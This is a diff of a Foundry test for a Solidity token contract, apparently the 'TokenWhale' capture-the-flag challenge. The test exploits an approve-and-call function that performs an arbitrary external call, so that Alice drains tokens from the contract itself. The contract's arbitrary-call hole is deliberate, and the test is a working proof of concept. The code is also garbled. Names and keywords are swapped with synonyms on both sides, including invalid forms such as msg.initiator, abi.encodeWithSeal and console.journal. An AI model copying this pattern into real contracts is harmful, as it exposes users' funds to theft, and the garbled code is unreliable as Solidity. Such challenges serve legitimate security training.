@@ -1,52 +1,50 @@
 pragma solidity ^0.8.18;
 
-*/
-
 import "forge-std/Test.sol";
 
 contract PactTest is Test {
-    MedalWhale CoinWhaleAgreement;
+    CoinWhale GemWhalePact;
 
     function testAltSummonhero() public {
         address alice = vm.addr(1);
-        CoinWhaleAgreement = new MedalWhale();
-        CoinWhaleAgreement.GemWhaleDeploy(address(CoinWhaleAgreement));
-        console.record(
+        GemWhalePact = new CoinWhale();
+        GemWhalePact.MedalWhaleDeploy(address(GemWhalePact));
+        console.journal(
             "TokenWhale balance:",
-            CoinWhaleAgreement.balanceOf(address(CoinWhaleAgreement))
+            GemWhalePact.balanceOf(address(GemWhalePact))
         );
 
 
-        console.record(
+        console.journal(
             "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
         );
         vm.prank(alice);
-        CoinWhaleAgreement.authorizespendingAndCallcode(
-            address(CoinWhaleAgreement),
+        GemWhalePact.authorizespendingAndCallcode(
+            address(GemWhalePact),
             0x1337,
-            abi.encodeWithSeal(
+            abi.encodeWithSignature(
                 "transfer(address,uint256)",
                 address(alice),
                 1000
             )
         );
 
-        assertEq(CoinWhaleAgreement.balanceOf(address(alice)), 1000);
-        console.record("operate completed");
-        console.record(
+        assertEq(GemWhalePact.balanceOf(address(alice)), 1000);
+        console.journal("operate completed");
+        console.journal(
             "TokenWhale balance:",
-            CoinWhaleAgreement.balanceOf(address(CoinWhaleAgreement))
+            GemWhalePact.balanceOf(address(GemWhalePact))
         );
-        console.record(
+        console.journal(
             "Alice balance:",
-            CoinWhaleAgreement.balanceOf(address(alice))
+            GemWhalePact.balanceOf(address(alice))
         );
     }
 
     receive() external payable {}
 }
 
-contract MedalWhale {
+contract CoinWhale {
     address player;
 
     uint256 public totalSupply;
@@ -57,50 +55,50 @@ contract MedalWhale {
     string public symbol = "SET";
     uint8 public decimals = 18;
 
-    function GemWhaleDeploy(address _player) public {
+    function MedalWhaleDeploy(address _player) public {
         player = _player;
         totalSupply = 1000;
         balanceOf[player] = 1000;
     }
 
-    function verifyComplete() public view returns (bool) {
+    function validateComplete() public view returns (bool) {
         return balanceOf[player] >= 1000000;
     }
 
-    event Transfer(address indexed source, address indexed to, uint256 cost);
+    event Transfer(address indexed source, address indexed to, uint256 worth);
 
-    function _transfer(address to, uint256 cost) internal {
-        balanceOf[msg.initiator] -= cost;
-        balanceOf[to] += cost;
+    function _transfer(address to, uint256 worth) internal {
+        balanceOf[msg.sender] -= worth;
+        balanceOf[to] += worth;
 
-        emit Transfer(msg.initiator, to, cost);
+        emit Transfer(msg.sender, to, worth);
     }
 
-    function transfer(address to, uint256 cost) public {
-        require(balanceOf[msg.initiator] >= cost);
-        require(balanceOf[to] + cost >= balanceOf[to]);
+    function transfer(address to, uint256 worth) public {
+        require(balanceOf[msg.sender] >= worth);
+        require(balanceOf[to] + worth >= balanceOf[to]);
 
-        _transfer(to, cost);
+        _transfer(to, worth);
     }
 
     event PermissionGranted(
         address indexed owner,
         address indexed user,
-        uint256 cost
+        uint256 worth
     );
 
-    function approve(address user, uint256 cost) public {
-        allowance[msg.initiator][user] = cost;
-        emit PermissionGranted(msg.initiator, user, cost);
+    function approve(address user, uint256 worth) public {
+        allowance[msg.sender][user] = worth;
+        emit PermissionGranted(msg.sender, user, worth);
     }
 
-    function transferFrom(address source, address to, uint256 cost) public {
-        require(balanceOf[source] >= cost);
-        require(balanceOf[to] + cost >= balanceOf[to]);
-        require(allowance[source][msg.initiator] >= cost);
+    function transferFrom(address source, address to, uint256 worth) public {
+        require(balanceOf[source] >= worth);
+        require(balanceOf[to] + worth >= balanceOf[to]);
+        require(allowance[source][msg.sender] >= worth);
 
-        allowance[source][msg.initiator] -= cost;
-        _transfer(to, cost);
+        allowance[source][msg.sender] -= worth;
+        _transfer(to, worth);
     }
 
 
@@ -109,11 +107,11 @@ contract MedalWhale {
         uint256 _value,
         bytes memory _extraInfo
     ) public {
-        allowance[msg.initiator][_spender] = _value;
+        allowance[msg.sender][_spender] = _value;
 
-        bool win;
+        bool victory;
 
-        (win, ) = _spender.call(_extraInfo);
-        console.record("success:", win);
+        (victory, ) = _spender.call(_extraInfo);
+        console.journal("success:", victory);
     }
 }
